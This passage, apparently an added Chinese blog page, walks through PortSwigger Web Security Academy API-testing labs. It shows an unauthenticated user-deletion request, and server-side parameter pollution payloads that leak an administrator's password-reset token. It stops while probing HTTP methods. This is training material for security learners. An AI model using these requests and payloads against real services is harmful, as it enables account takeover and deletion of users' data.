@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 API Testing。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy API Testing">
+<meta property="og:url" content="https://secdroid.github.io/2025/03/23/burp-web-academy-api-testing/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 API Testing。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://secdroid.github.io/images/burp-intruder-server-side-variable-names.png">
+<meta property="og:image" content="https://secdroid.github.io/images/restful-api-gateway-architecture.webp">
+<meta property="article:published_time" content="2025-03-23T03:30:20.105Z">
+<meta property="article:modified_time" content="2025-03-23T03:29:17.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="Path Traversal">
+<meta property="article:tag" content="Burp Intruder">
+<meta property="article:tag" content="API">
+<meta property="article:tag" content="HTTP Method">
+<meta property="article:tag" content="Burp Scanner">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://secdroid.github.io/images/burp-intruder-server-side-variable-names.png">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/03/23/burp-web-academy-api-testing/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/03/23/burp-web-academy-api-testing/","path":"2025/03/23/burp-web-academy-api-testing/","title":"Burp Web Academy API Testing"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy API Testing | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-API-Testing"><span class="nav-number">2.</span> <span class="nav-text">0x02. API Testing</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-Exploiting-an-API-endpoint-using-documentation"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: Exploiting an API endpoint using documentation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-Exploiting-server-side-parameter-pollution-in-a-query-string"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: Exploiting server-side parameter pollution in a query string</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-Finding-and-exploiting-an-unused-API-endpoint"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: Finding and exploiting an unused API endpoint</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-Exploiting-a-mass-assignment-vulnerability"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: Exploiting a mass assignment vulnerability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-Exploiting-server-side-parameter-pollution-in-a-REST-URL"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: Exploiting server-side parameter pollution in a REST URL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-RESTful-API"><span class="nav-number">4.</span> <span class="nav-text">0x04. RESTful API</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">5.</span> <span class="nav-text">0x05. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/03/23/burp-web-academy-api-testing/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy API Testing | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy API Testing
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-03-23 11:30:20 / 修改时间：11:29:17" itemprop="dateCreated datePublished" datetime="2025-03-23T11:30:20+08:00">2025-03-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的 API Testing。</p>
+<span id="more"></span>
+
+<h2 id="0x02-API-Testing"><a href="#0x02-API-Testing" class="headerlink" title="0x02. API Testing"></a>0x02. API Testing</h2><h3 id="2-1-Lab-Exploiting-an-API-endpoint-using-documentation"><a href="#2-1-Lab-Exploiting-an-API-endpoint-using-documentation" class="headerlink" title="2.1 Lab: Exploiting an API endpoint using documentation"></a>2.1 Lab: Exploiting an API endpoint using documentation</h3><blockquote>
+<p>To solve the lab, find the exposed API documentation and delete <code>carlos</code>. You can log in to your own account using the following credentials: <code>wiener:peter</code>.</p>
+</blockquote>
+<p>登陆后，在个人页面发现了如下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&#x27;login-form&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;email-change-form&#x27;</span> <span class="attr">onsubmit</span>=<span class="string">&#x27;changeEmail(this, event)&#x27;</span> <span class="attr">action</span>=<span class="string">&#x27;/api/user&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&#x27;email&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;email&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;username&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;wiener&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>&gt;</span> Update email <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;/resources/js/api/changeEmail.js&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;application/javascript&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有两个路径值得注意：</p>
+<ul>
+<li><code>/api/user</code></li>
+<li><code>/resources/js/api/changeEmail.js</code></li>
+</ul>
+<p>此外，在 <code>/resources/js/api/changeEmail.js</code> 中 <code>changeEmail</code> 的定义如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">changeEmail</span> = (<span class="params">form, e</span>) =&gt; &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(form);</span><br><span class="line">    <span class="keyword">const</span> username = formData.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> email = formData.<span class="title function_">get</span>(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fetch</span>(</span><br><span class="line">        <span class="string">`<span class="subst">$&#123;form.action&#125;</span>/<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(username)&#125;</span>`</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;PATCH&#x27;</span>,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="string">&#x27;email&#x27;</span>: email &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="title function_">handleResponse</span>(<span class="title function_">displayErrorMessage</span>(form)));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/api/user/wiener</code>，返回如下信息：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;wiener&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;wiener@normal-user.net&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/api/user</code>，返回如下信息：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;Malformed URL: expecting an identifier&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/api</code>，返回如下信息：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Verb</th>
+<th align="left">Endpoint</th>
+<th align="left">Parameters</th>
+<th align="left">Response</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">&#x2F;user&#x2F;[username: String]</td>
+<td align="left">{ }</td>
+<td align="left">200 OK, User</td>
+</tr>
+<tr>
+<td align="left">DELETE</td>
+<td align="left">&#x2F;user&#x2F;[username: String]</td>
+<td align="left">{ }</td>
+<td align="left">200 OK, Result</td>
+</tr>
+<tr>
+<td align="left">PATCH</td>
+<td align="left">&#x2F;user&#x2F;[username: String]</td>
+<td align="left">{“email”: String}</td>
+<td align="left">200 OK, User</td>
+</tr>
+</tbody></table>
+<p>所以，可以构造如下请求删除用户：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/api/user/carlos</span> <span class="meta">HTTP/2</span></span><br></pre></td></tr></table></figure>
+
+<p>返回信息：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>25</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;User deleted&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Lab-Exploiting-server-side-parameter-pollution-in-a-query-string"><a href="#2-2-Lab-Exploiting-server-side-parameter-pollution-in-a-query-string" class="headerlink" title="2.2 Lab: Exploiting server-side parameter pollution in a query string"></a>2.2 Lab: Exploiting server-side parameter pollution in a query string</h3><blockquote>
+<p>To solve the lab, log in as the <code>administrator</code> and delete <code>carlos</code>.</p>
+</blockquote>
+<p>登陆页面点击找回密码，发现加载了 <code>/static/js/forgotPassword.js</code>，关键代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">forgotPwdReady</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> queryString = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span><br><span class="line">    <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(queryString);</span><br><span class="line">    <span class="keyword">const</span> resetToken = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;reset-token&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (resetToken)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">`/forgot-password?reset_token=<span class="subst">$&#123;resetToken&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">const</span> forgotPasswordBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;forgot-password-btn&quot;</span>);</span><br><span class="line">        forgotPasswordBtn.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, displayMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里支持一个名为 <code>reset-token</code> 的参数，如果检测到，则重定向时将参数名修改为 <code>reset_token</code>，注意二者的区别。题目提示服务端参数污染，需要测试一下这个参数的行为。实际上，经过测试并没有什么有用的线索。</p>
+<p>尝试提交用户名找回密码，POST 请求发送如下参数：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf=G3cTq9CZ9OqRuvsGC8A4NAY4aGYjxl0H&amp;username=administrator</span><br></pre></td></tr></table></figure>
+
+<p>测试：</p>
+<ul>
+<li><code>username=xxx</code> 返回 <code>Invalid username.</code></li>
+<li><code>username=administrator&amp;test=666</code> 正常返回</li>
+<li><code>username=administrator%26test=666</code> 返回 <code>Parameter is not supported.</code><ul>
+<li>这里 <code>%26</code> 即 <code>&amp;</code>，说明 <code>test</code> 也被后端处理了</li>
+</ul>
+</li>
+<li><code>username=administrator#</code> 返回 <code>Field not specified.</code><ul>
+<li>这里 <code>#</code> 把后续参数屏蔽了（URL 中的 <code>#</code>），提示缺少 <code>Field</code></li>
+</ul>
+</li>
+<li><code>username=administrator%26field=666</code> 返回 <code>Invalid field.</code><ul>
+<li>确实存在 <code>field</code> 字段，但是值还不确定，可以使用 <a href="https://secdroid.github.io/tags/Burp-Intruder/">Burp Intruder</a> 进行爆破</li>
+<li>在 Burp Intruder 中，Payload Options 选择 <code>Add from list ...</code>，添加 Server-side variable names 参数列表</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/burp-intruder-server-side-variable-names.png" alt="Burp Intruder 添加 Server-side variable names 参数列表"></p>
+<p>发现 <code>email</code> 和 <code>username</code> 都是有效的 <code>field</code> 字段值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">csrf=G3cTq9CZ9OqRuvsGC8A4NAY4aGYjxl0H&amp;username=administrator%26field=email</span><br><span class="line">&#123;&quot;result&quot;:&quot;*****@normal-user.net&quot;,&quot;type&quot;:&quot;email&quot;&#125;</span><br><span class="line"></span><br><span class="line">csrf=G3cTq9CZ9OqRuvsGC8A4NAY4aGYjxl0H&amp;username=administrator%26field=username</span><br><span class="line">&#123;&quot;result&quot;:&quot;administrator&quot;,&quot;type&quot;:&quot;username&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回到最前面，尝试使用 <code>field=reset_token</code>，结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">csrf=G3cTq9CZ9OqRuvsGC8A4NAY4aGYjxl0H&amp;username=administrator%26field=reset_token</span><br><span class="line">&#123;&quot;result&quot;:&quot;mmtpmp8636ufyj56veoc1q4oqvmzuaki&quot;,&quot;type&quot;:&quot;reset_token&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到了重置密码的 Token，直接重置 <code>administrator</code> 的密码，随后删除 <code>carlos</code> 用户即可。</p>
+<h3 id="2-3-Lab-Finding-and-exploiting-an-unused-API-endpoint"><a href="#2-3-Lab-Finding-and-exploiting-an-unused-API-endpoint" class="headerlink" title="2.3 Lab: Finding and exploiting an unused API endpoint"></a>2.3 Lab: Finding and exploiting an unused API endpoint</h3><blockquote>
+<p>To solve the lab, exploit a hidden API endpoint to buy a <strong>Lightweight l33t Leather Jacket</strong>. You can log in to your own account using the following credentials: <code>wiener:peter</code>.</p>
+</blockquote>
+<p>进入商品页面，会请求 <code>/resources/js/api/productPrice.js</code>，关键代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">loadPricing</span> = (<span class="params">productId</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(location);</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">`//<span class="subst">$&#123;url.host&#125;</span>/api/products/<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(productId)&#125;</span>/price`</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="title function_">handleResponse</span>(<span class="title function_">getAddToCartForm</span>()));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(location);</span><br><span class="line">    <span class="keyword">const</span> productId = url.<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;productId&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&quot;/product&quot;</span>) &amp;&amp; productId != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title function_">loadPricing</span>(productId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>进一步请求 <code>/api/products/1/price</code>，返回价格信息：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /api/products/<span class="number">1</span>/price HTTP/<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;price&quot;</span><span class="punctuation">:</span><span class="string">&quot;$1337.00&quot;</span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;I heard your neighbor Sally bought one of these! Don&#x27;t feel left out!&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据题目的提示，可能需要更改 HTTP Method，那么先看看 HTTP Method 都有哪些？</p>
+<table>
+<thead>
+<tr>
+<th align="left">Method</th>
+<th align="left">Safe</th>
+<th align="left">Idempotent</th>
+<th align="left">Cacheable</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">Yes</td>
+<td align="left">Yes</td>
+<td align="left">Yes</td>
+</tr>
+<tr>
+<td align="left">HEAD</td>
+<td align="left">Yes</td>
+<td align="left">Yes</td>
+<td align="left">Yes</td>
+</tr>
+<tr>
+<td align="left">OPTIONS</td>
+<td align="left">Yes</td>
+<td align="left">Yes</td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">TRACE</td>
+<td align="left">Yes</td>
+<td align="left">Yes</td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">PUT</td>
+<td align="left">No</td>
+<td align="left">Yes</td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">DELETE</td>
+<td align="left">No</td>
+<td align="left">Yes</td>
+<td align="left">No</td>
+</tr>
+<tr>
+<td align="left">POST</td>
+<td align="left">No</td>
+<td align="left">No</td>
+<td align="left">Conditional</td>
+</tr>
+<tr>
+<td align="left">PATCH</td>
+<td align="left">No</td>
+<td align="left">No</td>
+<td align="left">Conditional</td>
+</tr>
+<tr>
+<td align="left">CONNECT</td>
+<td align="left">No</td>
+<td align="left">No</td>
+<td align="left">No</td>
+</tr>
+</tbody></table>
+<p>经测试，发现除了 <code>PATCH</code> 返回 <code>Unauthorized</code> 之外，其他方法均返回 <code>Method Not Allowed</code>。</p>
